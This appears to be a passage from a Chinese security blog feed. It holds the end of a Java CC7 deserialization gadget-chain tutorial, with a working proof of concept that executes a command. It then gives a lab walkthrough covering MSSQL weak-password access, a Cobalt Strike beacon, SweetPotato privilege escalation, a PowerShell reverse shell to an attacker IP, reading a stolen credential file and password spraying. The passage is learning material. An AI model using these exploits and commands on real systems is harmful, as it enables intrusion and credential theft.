<span class="title class_">HashCrack</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;Aa&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;BB&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        System.out.println(lazyMap1.hashCode());</span><br><span class="line">        System.out.println(lazyMap2.hashCode());</span><br><span class="line">        System.out.println(lazyMap1.equals(lazyMap2));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###</span><br><span class="line"><span class="number">2113</span></span><br><span class="line"><span class="number">2113</span></span><br><span class="line"><span class="literal">false</span></span><br></pre></td></tr></table></figure><p>这里会弹计算器不用在意。</p><p>我们能通过后就继续走了，接着我们就会去调用到LazyMap的equals方法，但是LazyMap它没有equals方法，所以我们调用的是它的父类AbstractMapDecorator的方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210948626.png" alt="img"></p><p>然后这里会判断传进来的object与当前实例是否为同一对象，前面那段代码其实已经判断出来了为false，接着就是调用LazyMap实例中的map对象的equals，我们LazyMap实例化的时候是传了map和一个chainedTransformer：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br></pre></td></tr></table></figure><p>所以是去调用了hashMap1的equals方法，但是HashMap没有equals方法，所以会调用它父类AbstractMap的equals方法。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210948897.png" alt="img"></p><p> 我们调试那段试验的代码，也是能够走到这里来。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210948455.png" alt="img"></p><p>这里其实就是用LazyMap的实例和HashMap的实例去做equals判断了，然后就会触发到LazyMap的get方法，随后就是chainedTransformer的一系列操作了。</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>接下来就是构造poc了。</p><p>首先我们需要两个LazyMap的实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br></pre></td></tr></table></figure><p>用于后面的hash碰撞，我们还需要给两个lazyMap分别传入Aa和BB，并且实例化Hashtable将两个lazyMap传进去。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lazyMap1.put(<span class="string">&quot;Aa&quot;</span>,<span class="number">1</span>);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;BB&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>但当我们直接运行这段代码的时候会发现计算器会在未进行序列化和反序列化的操作下弹出来。</p><p>经过调试可以发现是hashtable的put函数造成的，我们可以去看看它的实现。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503210948428.png" alt="img"></p><p>在它的put里面有着和reconstitutionPut方法一样的判断（hashtable的大部分方法都有这个判断），从而导致了命令提前触发。</p><p>我们需要在hashtable的put之前不进行hash碰撞，所以我们将lazyMap2的BB放在put后传入就行了。</p><p>所以最终的POC如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.mashiro;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers= <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;Aa&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">1</span>);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;BB&quot;</span>,<span class="number">1</span>); <span class="comment">// map是引用类型，直接改lazyMap2,hashtable里面的就会变化</span></span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream objectInputStream=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>一直逃避的Java安全，最近才开始重新学习。学完这些链子，我觉得重点是弄懂基本类和如何触发恶意方法，在CC链里面最重要的就是CC1链和CC3链了，反复把这两条链弄懂后面的链子就基本上能够自己调试分析了，当然从其他简单的链子层层递进的学习到复杂链子也算是一种方式。</p><p>刚开始入手都很难，反复看总能看懂。</p><p>参考链接：</p><p><a href="https://space.bilibili.com/2142877265/lists">https://space.bilibili.com/2142877265/lists</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13910833.html">https://www.cnblogs.com/nice0e3/p/13910833.html</a></p><p><a href="https://infernity.top/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/">https://infernity.top/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/</a></p><p><a href="https://cloud.tencent.com/developer/article/2287116">https://cloud.tencent.com/developer/article/2287116</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13860621.html#0x02-poc%E5%88%86%E6%9E%90">https://www.cnblogs.com/nice0e3/p/13860621.html#0x02-poc%E5%88%86%E6%9E%90</a></p><p><a href="https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/#%E4%BF%AE%E6%94%B9size%E7%9A%84poc%EF%BC%9A">https://infernity.top/2024/04/17/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC4%E9%93%BE/#%E4%BF%AE%E6%94%B9size%E7%9A%84poc%EF%BC%9A</a></p><p><a href="https://cloud.tencent.com/developer/article/2287105">https://cloud.tencent.com/developer/article/2287105</a></p><p><a href="https://www.cnblogs.com/nice0e3/p/13854098.html#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86">https://www.cnblogs.com/nice0e3/p/13854098.html#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86</a></p><p><a href="https://www.freebuf.com/articles/web/391842.html">https://www.freebuf.com/articles/web/391842.html</a></p><p><a href="https://xz.aliyun.com/news/12115">https://xz.aliyun.com/news/12115</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Tsclient</title>
      <link href="/2025/02/11/Tsclient/"/>
      <url>/2025/02/11/Tsclient/</url>
      
        <content type="html"><![CDATA[<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>目标靶机ip为：39.99.144.3</p><p>分两次打的，中间换了ip</p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a><strong>flag1</strong></h2><p>fscan直接扫一波。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004117.png" alt="img"></p><p>可以发现直接爆出了mssql的弱口令，我们直接用 MDUT  工具打。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004422.png" alt="img"></p><p>然后我们直接进入功能界面，先激活组件，然后就可以执行命令了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004284.png" alt="img"></p><p>这里先配置一下cs（第一次用）</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/118243520">https://blog.csdn.net/weixin_39190897/article/details/118243520</a></p><p>我们先把teamserver.zip传入到vps上面，然后unzip解压后运行。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]</span><br><span class="line">&lt;host&gt; // 必需参数 团队服务器IP</span><br><span class="line">&lt;password&gt; // 必需参数 连接服务器的密码</span><br><span class="line">[/path/to/c2.profile] // 可选参数 指定C2通信配置文件，体现其强大的扩展性</span><br><span class="line">[YYYY-MM-DD] // 可选参数 所有payload的终止时间</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004432.png" alt="img"></p><p>直接运行加上我们vps的ip和想要设置的密码即可，然后cs连接。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004775.png" alt="img"></p><p>我们先来创造一个监听器。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141032274.png" alt="image-20250314103237565"></p><p>然后我们在有效载荷地方选择windows的可执行程序。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141004962.png" alt="img"></p><p>选择我们的监听器，然后会选择一个路径保存文件，我们将该文件上传到靶机中去。我们选择C:&#x2F;Windows&#x2F;Temp&#x2F;这个目录。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">artifact.exe</span></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005319.png" alt="img"></p><p>然后去运行它，我们在cs上面就可以接受到会话了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005907.png" alt="img"></p><p>但是权限还是很低。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005156.png" alt="img"></p><p>这里我们需要使用printspoofer或者sweetpotato提权。</p><p><a href="https://github.com/dievus/printspoofer">https://github.com/dievus/printspoofer</a></p><p><a href="https://github.com/uknowsec/SweetPotato/tree/master?tab=readme-ov-file">https://github.com/uknowsec/SweetPotato/tree/master?tab=readme-ov-file</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">SweetPotato.exe</span> -<span class="title">a</span> <span class="title">whoami</span></span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005040.png" alt="img"></p><p>这里都可以，个人感觉sweetpotato好像好一点？</p><p>拿到了system权限。然后我们再用这个去执行前面传的cs马，上线system权限。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">SweetPotato.exe</span> -<span class="title">a</span> &quot;<span class="title">C</span>:/<span class="title">Windows</span>/<span class="title">Temp</span>/<span class="title">artifact.exe</span>&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005469.png" alt="img"></p><p>我感觉cs命令执行太慢了，我直接弹shell出来用。用powershell把system的权限弹出来。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell powershell <span class="literal">-nop</span> <span class="literal">-c</span> <span class="string">&quot;<span class="variable">$client</span> = New-Object System.Net.Sockets.TCPClient(&#x27;ip&#x27;,7777);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = 0..65535|%&#123;0&#125;;while((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, 0, <span class="variable">$bytes</span>.Length)) -ne 0)&#123;;<span class="variable">$data</span> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,0, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (iex <span class="variable">$data</span> 2&gt;&amp;1 | Out-String );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + &#x27;PS &#x27; + (pwd).Path + &#x27;&gt; &#x27;;<span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,0,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close()&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005241.png" alt="img"></p><p>我们可以在administrator目录下面看到有一个flag。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005680.png" alt="img"></p><p>这是个目录，我们进去可以看到flag1直接拿就行了。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141005911.png" alt="img"></p><p>flag1为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8619d038-7f50-4e26-bddd-b0edc3f2cf47&#125;</span><br></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a><strong>flag2</strong></h2><p>上传fscan扫一遍内网。chcp 65001改下编码，然后看看ip所处网段（cs上线的时候也有）。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006099.png" alt="img"></p><p>开扫。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fscan.exe -h 172.22.8.0/24</span><br></pre></td></tr></table></figure><details class="lake-collapse"><summary id="ud2e05b3f"><span class="ne-text">结果</span></summary><p id="u3c7b6d96" class="ne-p" style="margin: 0; padding: 0; min-height: 24px"><span class="ne-text">start infoscan                                                                                         <br></span><span class="ne-text">(icmp) Target 172.22.8.18     is alive                                                                 <br></span><span class="ne-text">(icmp) Target 172.22.8.15     is alive                                                                 <br></span><span class="ne-text">(icmp) Target 172.22.8.31     is alive                                                                 <br></span><span class="ne-text">(icmp) Target 172.22.8.46     is alive                                                                 <br></span><span class="ne-text">[*] Icmp alive hosts len is: 4                                                                         <br></span><span class="ne-text">172.22.8.46:445 open                                                                                   <br></span><span class="ne-text">172.22.8.31:445 open                                                                                   <br></span><span class="ne-text">172.22.8.18:1433 open                                                                                  <br></span><span class="ne-text">172.22.8.15:445 open                                                                                   <br></span><span class="ne-text">172.22.8.18:445 open                                                                                   <br></span><span class="ne-text">172.22.8.46:139 open                                                                                   <br></span><span class="ne-text">172.22.8.31:139 open                                                                                   <br></span><span class="ne-text">172.22.8.15:139 open                                                                                   <br></span><span class="ne-text">172.22.8.46:135 open                                                                                   <br></span><span class="ne-text">172.22.8.18:139 open                                                                                   <br></span><span class="ne-text">172.22.8.31:135 open                                                                                   <br></span><span class="ne-text">172.22.8.15:135 open                                                                                   <br></span><span class="ne-text">172.22.8.18:135 open                                                                                   <br></span><span class="ne-text">172.22.8.46:80 open                                                                                    <br></span><span class="ne-text">172.22.8.18:80 open                                                                                    <br></span><span class="ne-text">172.22.8.15:88 open                                                                                    <br></span><span class="ne-text">[*] alive ports len is: 16                                                                             <br></span><span class="ne-text">start vulscan                                                                                          <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.46                                                                                         <br></span><span class="ne-text">   [-&gt;]WIN2016                                                                                         <br></span><span class="ne-text">   [-&gt;]172.22.8.46                                                                                     <br></span><span class="ne-text">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01                                                       <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.31                                                                                         <br></span><span class="ne-text">   [-&gt;]WIN19-CLIENT                                                                                    <br></span><span class="ne-text">   [-&gt;]172.22.8.31                                                                                     <br></span><span class="ne-text">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT                                                      <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.18                                                                                         <br></span><span class="ne-text">   [-&gt;]WIN-WEB                                                                                         <br></span><span class="ne-text">   [-&gt;]172.22.8.18                                                                                     <br></span><span class="ne-text">   [-&gt;]2001:0:348b:fb58:1841:15cd:d89c:6ffc                                                            <br></span><span class="ne-text">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393   <br></span><span class="ne-text">[*] NetInfo                                                                                            <br></span><span class="ne-text">[*]172.22.8.15                                                                                         <br></span><span class="ne-text">   [-&gt;]DC01                                                                                            <br></span><span class="ne-text">   [-&gt;]172.22.8.15                                                                                     <br></span><span class="ne-text">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server                    <br></span><span class="ne-text">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server                    <br></span><span class="ne-text">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ                                                                 <br></span><span class="ne-text">?????16/16                                                                                             <br></span><span class="ne-text">[*] ??????,???: 25.3572412s</span></p></details><p>直接交给ai分析一波。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006282.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141020020.png" alt="img"></p><p>根据端口也没什么好打的洞（这里是都开了3389，但是我没有扫出来），我们再次看18这台。我们可以做一些信息收集。</p><p><code>quser</code> 命令是一个用于显示远程桌面会话主机服务器上的用户会话信息的Windows命令行工具。这个命令可以帮助你确定特定用户是否已经登录到特定的远程桌面会话主机服务器。  </p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006526.png" alt="img"></p><p>可以发现有个john会话为rdp远程连接并且为admin，我们去cs上进行进程注入拿到john的会话。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141021905.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141030177.png" alt="img"></p><p>我们net use会发现它通过tsclient挂载了C盘。</p><p><a href="https://www.cnblogs.com/mamiyiya777/p/11017875.html">https://www.cnblogs.com/mamiyiya777/p/11017875.html</a></p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006211.png" alt="img"></p><p>我们去列目录。</p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006204.png" alt="img"></p><p>发现有一个credential.txt文件，<code>credential.txt</code> 文件通常用于存储Git操作中的登录用户名和密码。在使用Git进行版本控制时，为了简化登录流程，避免每次操作都需要手动输入用户名和密码，可以使用凭证存储功能。 </p><p>我们用type命令去读取它。<code>type</code> 是 Windows 命令提示符中的一个命令，用于显示文本文件的内容。  </p><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141006209.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#</span><br></pre></td></tr></table></figure><p>拿到用户名和密码，并且下面有一个提示，你知道如何劫持镜像吗。</p><p>接下来我们直接cs搭建隧道，用socks5就行了。然后修改我们proxychains的配置文件。</p><p>然后进行密码喷洒。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains -q crackmapexec smb 172.22.8.0/24 -u &#x27;Aldrich&#x27; -p &#x27;Ald@rLMWuy7Z!#&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Mashiro726/mash1r0img/main/jpg/202503141007004.png" 